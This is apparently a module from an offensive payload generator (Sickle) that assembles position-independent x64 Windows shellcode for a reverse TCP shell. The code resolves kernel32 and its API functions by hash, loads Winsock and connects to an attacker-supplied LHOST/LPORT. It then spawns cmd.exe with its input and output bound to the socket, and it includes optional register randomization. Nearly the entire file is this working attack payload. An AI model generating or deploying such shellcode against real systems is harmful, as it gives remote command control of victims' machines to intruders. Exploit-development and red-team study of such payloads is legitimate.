import sys
import struct

from sickle.common.lib.reversing.mappings import Mappings # Experimental
from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.lib.generic.mparser import argument_check
from sickle.common.lib.generic.convert import port_str_to_htons
from sickle.common.lib.generic.convert import from_str_to_xwords
from sickle.common.lib.generic.convert import ip_str_to_inet_addr
from sickle.common.lib.generic.convert import from_str_to_win_hash

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) CMD Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["Morten Schenk",
              "Alexandru Uifalvi",
              "Matteo Memelli",
              "wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.17763 N/A Build 17763)"]

    summary = ("A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe "
               "session")

    description = """
    A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe
    session. Since this payload is not staged, there is no need for anything
    more than a Netcat listener.
    """

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    arguments["RREGS"] = {}
    arguments["RREGS"]["optional"] = "yes"
    arguments["RREGS"]["description"] = "Randomize registers"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        self.builder = Assembler(Shellcode.arch)
        self.map = Mappings(Shellcode.arch) # Experimental
        self.randomize_regs = False # Experimental

        arg_object["architecture"] = Shellcode.arch

        return

    def get_kernel32(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """

        if self.randomize_regs:

            # Avoid modifying the return value or the stack frame
            self.map.exclusion_list = ["rsp", "rax", "rbp"]

            # Generate the initial registers used   
            rcx, r8, rdi, rsi = self.map.gen_regs(4, 64)
            full_map = self.map.get_full_mapping()
            cx = full_map[rcx][1]

            # Update the exclusion list to avoid collision with previously used registers
            self.map.exclusion_list.extend([rcx, r8, rdi, rsi])

            # Generate last register used with exclusion list updated
            dl = self.map.gen_regs(1, 8)[0]

        else:

            rcx, r8, rdi, rax, rsi, cx, dl = "rcx", "r8", "rdi", "rax", "rsi", "cx", "dl"

        stub = f"""
; DWORD64 getKernel32()
; {{
;	 CHAR c = 'K';
;	 PPEB pPEB = (PPEB)__readgsqword(0x60);
;	 PPEB_LDR_DATA pLdrData = (PLDR_DATA_TABLE_ENTRY)pPEB->Ldr;
;	 DWORD64 pHeadEntry = ((DWORD64)((PLDR_DATA_TABLE_ENTRY)pPEB->Ldr->InInitializationOrderModuleList.Flink));
;
;	 PLIST_ENTRY pEntry = ((PLIST_ENTRY)pHeadEntry)->Flink;
;	 while (1) {{
;		 PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)((DWORD64)pEntry - 0x10);
;		 if (((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[0]) == c) && ((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[13]) == '\0')) {{
;			 return pLdrDataTableEntry->InInitializationOrderLinks.Flink;
;		 }}
;
;		 pEntry = pEntry->Flink;
;	 }}
; }}

getKernel32:
    mov {dl}, 0x4b
getPEB:
    mov {rcx}, 0x60
    mov {r8}, gs:[{rcx}]
getHeadEntry:
    mov {rdi}, [{r8} + 0x18]
    mov {rdi}, [{rdi} + 0x30]
search:
    xor {rcx}, {rcx}
    mov rax, [{rdi} + 0x10]
    mov {rsi}, [{rdi} + 0x40]
    mov {rdi}, [{rdi}]
    cmp [{rsi} + 0x18], {cx}
    jne search
    cmp [{rsi}], {dl}
    jne search
    ret
        """

        return stub

    def lookup_function(self):
        """Generates the stub responsible for obtaining the base address of a function
        """

        stub = """
; UINT hashAlgorithm(char* functionName)
; {
;	 DWORD hash = 0x00;
;	 DWORD rorByte = 0x0D;
;	 for (int i = 0; i < (strlen(functionName)); i++)
;	 {
;		 hash += (UINT16)functionName[i] & 0xFFFFFFFF;
;		 if (i < (strlen(functionName) - 1)) {
;			 hash = ((hash >> rorByte) | (hash << (32 - rorByte))) & 0xFFFFFFFF;
;		 }
;	 }
;	 return hash;
; }
;
; void lookupFunction(LPVOID moduleBase, UINT functionHash) {
;	 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
;	 PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
;	 IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)moduleBase + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
;	 DWORD* addressOfNames = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNames);
;	 DWORD numberOfNames = exportDirectory->NumberOfNames;
;
;	 DWORD i = numberOfNames;
;	 while (i-- != 0) {
;		 char* functionNameFromModule = (char*)((BYTE*)moduleBase + addressOfNames[i]);
;		 if (hashAlgorithm(functionNameFromModule) == functionHash) {
;			 DWORD* addressOfFunctions = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfFunctions);
;			 DWORD* addressOfNameOrdinals = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals);
;			 WORD ordinal = ((WORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals))[i];
;			 return (LPVOID)((BYTE*)moduleBase + addressOfFunctions[ordinal]);
;		 }
;	 }
; }

lookupFunction:
    mov ebx, [rdi + 0x3c]
    add rbx, 0x88
    add rbx, rdi
    mov eax, [rbx]
    mov rbx, rdi
    add rbx, rax
    mov eax, [rbx + 0x20]
    mov r8, rdi
    add r8, rax
    mov rcx, [rbx + 0x18]
parseNames:
    jecxz error
    dec ecx
    mov eax, [r8 + rcx * 4]
    mov rsi, rdi
    add rsi, rax
    xor r9, r9
    xor rax, rax
    cld
calcHash:
    lodsb
    test al, al
    jz calcDone
    ror r9d, 0xD
    add r9, rax
    jmp calcHash
calcDone:
    cmp r9d, edx
    jnz parseNames
findAddress:
    mov r8d, [rbx + 0x24]
    add r8, rdi
    xor rax, rax
    mov ax, [r8 + rcx * 2]
    mov r8d, [rbx + 0x1c]
    add r8, rdi
    mov eax, [r8 + rax * 4]
    add rax, rdi
found:

error:
    ret
        """

        return stub

    def load_library(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        lists = from_str_to_xwords(lib)
        write_index = 0x100

        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
        for i in range(len(lists["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
            src += "    mov [r15+{}], rcx\n".format(hex(write_index))
            write_index += 8

        for i in range(len(lists["DWORD_LIST"])):
            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
            src += "    mov [r15+{}], ecx\n".format(hex(write_index))
            write_index += 4

        for i in range(len(lists["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    mov [r15+{}], cx\n".format(hex(write_index))
            write_index += 2

        for i in range(len(lists["BYTE_LIST"])):
            src += "    mov cl, 0x{}\n".format( hex(lists["BYTE_LIST"][i]) )
            src += "    mov [r15+{}], cl\n".format(hex(write_index))
            write_index += 1

        src += """
    lea rcx, [r15+0x100]
    mov rax, [r15+0x80]
    call rax
        """

        return src

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])

        if ("RREGS" in argv_dict.keys()):
            self.randomize_regs = (argv_dict["RREGS"].lower() == "true")


        shellcode = """
_start:
    call getKernel32
    mov rdi, rax

stackAlign:
    sub rsp, 8
    mov r15, rsp

get_CreateProcessA:
    mov edx, {}
    call lookupFunction
    mov [r15 + 0x90], rax

get_TerminateProcess:
    mov edx, {}
    call lookupFunction
    mov [r15 + 0x88], rax

get_LoadLibraryA:
    mov edx, {}
    call lookupFunction
    mov [r15+0x80], rax
        """.format(from_str_to_win_hash("CreateProcessA"),
                   from_str_to_win_hash("TerminateProcess"),
                   from_str_to_win_hash("LoadLibraryA"))


        shellcode += self.load_library("ws2_32.dll")

        shellcode += """
    mov rdi, rax
get_WSAStartup:
    mov edx, {}
    call lookupFunction
    mov [r15+0x98], rax

get_WSASocketA:
    mov edx, {}
    call lookupFunction
    mov [r15+0xa0], rax

get_Connect:
    mov edx, {}
    call lookupFunction
    mov [r15+0xa8], rax

; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [r15+0x200]
    mov rax, [r15+0x98]
    call rax

; RAX => WSASocketA([in] int                 af,              // RCX      => 0x02 (AF_INET)
;                   [in] int                 type,            // RDX      => 0x01 (SOCK_STREAM)
;                   [in] int                 protocol,        // R8       => 0x08 (IPPROTO_TCP)
;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9       => NULL
;                   [in] GROUP               g,               // RSP+0x20 => NULL
;                   [in] DWORD               dwFlags);        // RSP+0x28 => NULL
call_WSASocketA:
    mov ecx, 2
    mov edx, 1
    mov r8, 6
    xor r9, r9
    mov [rsp+0x20], r9
    mov [rsp+0x28], r9
    mov rax, [r15+0xa0]
    call rax
    mov rsi, rax                ; save the socket file descriptor (sockfd)

; RAX => connect([in] SOCKET s,             // RCX => sockfd (Obtained from WSASocketA)
;                [in] const sockaddr *name, // RDX => {{ IP | PORT | SIN_FAMILY }}
;                [in] int namelen);         // R8  => 0x10
call_connect:
    mov rcx, rax
    mov r8, 0x10
    lea rdx, [r15+0x220]
    mov r9, {}{}0002
    mov [rdx], r9
    xor r9, r9
    mov [rdx+0x8], r9
    mov rax, [r15+0xa8]
    call rax

; [RBX] => typedef struct _STARTUPINFOA {{ }}
setup_STARTUPINFOA:
    mov rdi, r15
    add rdi, 0x300
    mov rbx, rdi
    xor eax, eax
    mov ecx, 0x20
    rep stosd           ; Zero 0x80 bytes
    mov eax, 0x68       ; lpStartInfo.cb = sizeof(_STARTUPINFO)
    mov [rbx], eax
    mov eax, 0x100      ; STARTF_USESTDHANDLES
    mov [rbx+0x3c], eax ; lpStartupInfo.dwFlags
    mov [rbx+0x50], rsi ; lpStartupInfo.hStdInput = socket handle
    mov [rbx+0x58], rsi ; lpStartupInfo.hStdOutput = socket handle
    mov [rbx+0x60], rsi ; lpStartupInfo.hStdError = socket handle

; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8       => NULL
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9       => NULL
;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20 => NULL
;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28 => 0x01 (DEBUG_PROCESS)
;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30 => NULL
;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo ()
call_CreateProccessA:
    xor ecx, ecx                 ; lpApplicationName
    mov rdx, r15                 ; lpCommandLine
    add rdx, 0x180               ;
    mov eax, 0x646d63            ; "cmd"
    mov [rdx], rax
    xor r8, r8                   ; lpProcessAttributes
    xor r9, r9                   ; lpThreadAttributes
    xor eax, eax                 ;
    inc eax
    mov [rsp + 0x20], rax        ; bInheritHandles
    dec eax
    mov [rsp + 0x28], rax        ; dwCreationFlags
    mov [rsp + 0x30], rax        ; lpEnvironment
    mov [rsp + 0x38], rax        ; lpCurrentDirectory
    mov [rsp + 0x40], rbx        ; lpStartupInfo
    add rbx, 0x68
    mov [rsp + 0x48], rbx        ; lpProcessInformation
    mov rax, [r15 + 0x90]
    call rax

; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
call_TerminateProcess:
	xor rcx, rcx
	dec rcx
	xor rdx, rdx
	mov rax, [r15+0x88]
	call rax
        """.format(from_str_to_win_hash("WSAStartup"),
                   from_str_to_win_hash("WSASocketA"),
                   from_str_to_win_hash("connect"),
                   hex(ip_str_to_inet_addr(argv_dict["LHOST"])),
                   struct.pack("<H", lport).hex())

        shellcode += self.get_kernel32()
        shellcode += self.lookup_function()

        return shellcode

    def get_shellcode(self):
        """Generates Windows (x64) generic reverse shell
        """

        return self.builder.get_bytes_from_asm(self.generate_source())
